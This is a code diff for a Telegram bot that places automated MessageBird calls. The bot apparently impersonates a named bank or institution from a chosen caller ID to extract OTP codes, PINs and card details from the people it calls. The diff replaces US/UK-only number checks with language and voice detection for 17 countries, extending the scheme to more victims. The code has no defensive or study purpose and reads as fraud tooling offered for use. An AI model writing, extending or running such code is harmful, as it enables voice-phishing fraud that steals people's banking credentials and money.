@@ -1,9 +1,11 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 import { Middleware, Markup } from 'telegraf';
+import { getCountry } from '../languages/helpers/getCountry';
+import { getLangAndVoice } from '../languages/helpers/getLangAndVoice';
 import { C } from '../types';
 import { UK_NUM, US_NUM } from '../utils/constants';
 import { messagebirdMakeACall } from '../utils/messagebird';
-import { validateNumber } from '../utils/validateNumber';
+import { getNotValidNumberMsg } from './helpers/getNotValidNumberMsg';
 
 let chatId: number | undefined;
 
@@ -32,12 +34,38 @@ export const steps = (step: string): Array<Middleware<C>> => [
     }
 
     // @ts-expect-error ts doesn't not recognise text on message
-    if (!validateNumber(ctx.message.text)) {
-      await ctx.replyWithHTML(
-        `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-      );
+    const number = await getLangAndVoice(ctx.message.text);
+
+    if (!number.language) {
+      await ctx.replyWithHTML(`Country not supported yet.
+      We currently suport:
+          🇺🇸 United State 
+          🇦🇺 Australia 
+          🇬🇧 Great Britain 
+          🇳🇿 New Zealand 
+          🇿🇦 South Africa 
+          🇪🇸 Spain 
+          🇵🇹 Portugal 
+          🇧🇷 Brazil 
+          🇮🇹 Italia 
+          🇫🇷 France 
+          🇩🇪 Germany 
+          🇳🇴 Norway 
+          🇵🇱 Poland 
+          🇸🇪 Sweden 
+          🇹🇷 Turkey 
+          🇳🇱 Netherland 
+          🇩🇰 Denmark 
+      `);
       return;
     }
+
+    // if (!validateNumber(ctx.message.text)) {
+    //   await ctx.replyWithHTML(
+    //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+    //   );
+    //   return;
+    // }
     await ctx.replyWithHTML(
       `Good,\n\nReply with the ${
         step === 'account' ? 'institution name 🏢' : 'bank name 🏦'
@@ -55,8 +83,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
     );
 
-    // @ts-expect-error ts doesn't not recognise state
-    ctx.wizard.state.callData.number = ctx.message.text;
+    ctx.wizard.state.callData.number = number;
 
     return ctx.wizard.next();
   },
@@ -82,10 +109,16 @@ export const steps = (step: string): Array<Middleware<C>> => [
   ...(step === 'pay'
     ? [
         async (ctx: any) => {
-          if (!validateNumber(ctx.message.text)) {
-            await ctx.replyWithHTML(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-            );
+          // if (!validateNumber(ctx.message.text)) {
+          //   await ctx.replyWithHTML(
+          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+          //   );
+          //   return;
+          // }
+
+          const number = await getLangAndVoice(ctx.message.text);
+          if (!number.language) {
+            await ctx.replyWithHTML(getNotValidNumberMsg());
             return;
           }
 
@@ -123,12 +156,19 @@ export const steps = (step: string): Array<Middleware<C>> => [
   ...(step === 'card'
     ? [
         async (ctx: any) => {
-          if (!validateNumber(ctx.message.text)) {
-            await ctx.replyWithHTML(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-            );
+          // if (!validateNumber(ctx.message.text)) {
+          //   await ctx.replyWithHTML(
+          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+          //   );
+          //   return;
+          // }
+
+          const number = await getLangAndVoice(ctx.message.text);
+          if (!number.language) {
+            await ctx.replyWithHTML(getNotValidNumberMsg());
             return;
           }
+
           await ctx.replyWithHTML(
             `💳 Select card type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
               /^./,
@@ -147,12 +187,19 @@ export const steps = (step: string): Array<Middleware<C>> => [
   ...(step === 'pin'
     ? [
         async (ctx: any) => {
-          if (!validateNumber(ctx.message.text)) {
-            await ctx.replyWithHTML(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-            );
+          // if (!validateNumber(ctx.message.text)) {
+          //   await ctx.replyWithHTML(
+          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+          //   );
+          //   return;
+          // }
+
+          const number = await getLangAndVoice(ctx.message.text);
+          if (!number.language) {
+            await ctx.replyWithHTML(getNotValidNumberMsg());
             return;
           }
+
           await ctx.replyWithHTML(
             `🔐 Select pin type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
               /^./,
@@ -171,12 +218,19 @@ export const steps = (step: string): Array<Middleware<C>> => [
   ...(step === 'account'
     ? [
         async (ctx: any) => {
-          if (!validateNumber(ctx.message.text)) {
-            await ctx.replyWithHTML(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-            );
+          // if (!validateNumber(ctx.message.text)) {
+          //   await ctx.replyWithHTML(
+          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+          //   );
+          //   return;
+          // }
+
+          const number = await getLangAndVoice(ctx.message.text);
+          if (!number.language) {
+            await ctx.replyWithHTML(getNotValidNumberMsg());
             return;
           }
+
           await ctx.replyWithHTML(
             `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
             Markup.inlineKeyboard([
@@ -232,12 +286,19 @@ export const steps = (step: string): Array<Middleware<C>> => [
   ...(step === `bank`
     ? [
         async (ctx: any) => {
-          if (!validateNumber(ctx.message.text)) {
-            await ctx.replyWithHTML(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-            );
+          // if (!validateNumber(ctx.message.text)) {
+          //   await ctx.replyWithHTML(
+          //     `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+          //   );
+          //   return;
+          // }
+
+          const number = await getLangAndVoice(ctx.message.text);
+          if (!number.language) {
+            await ctx.replyWithHTML(getNotValidNumberMsg());
             return;
           }
+
           await ctx.replyWithHTML(
             `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
             Markup.inlineKeyboard([
@@ -317,11 +378,15 @@ export const steps = (step: string): Array<Middleware<C>> => [
       otpLength,
     } = ctx.wizard.state.callData;
 
+    const country = number.country;
+
     await ctx.replyWithHTML(
-      `Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(
+      `Calling ${
+        number.to
+      }\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(
         /^./,
         step[0].toUpperCase(),
-      )} ~</i></b>`,
+      )} ~</i>\n\n${country.flag} ${country.name}</b>`,
     );
 
     chatId =
@@ -339,7 +404,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
 
     await messagebirdMakeACall({
       from: callerId,
-      to: number,
+      to: number.to,
       institutionName,
       transferNumber,
       step,
@@ -349,7 +414,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       chatId,
       pinType,
       otpLength,
-      language: number[0] === `1` ? `en-us` : `en-gb`,
+      language: number.language,
     });
 
     return ctx.wizard.next();
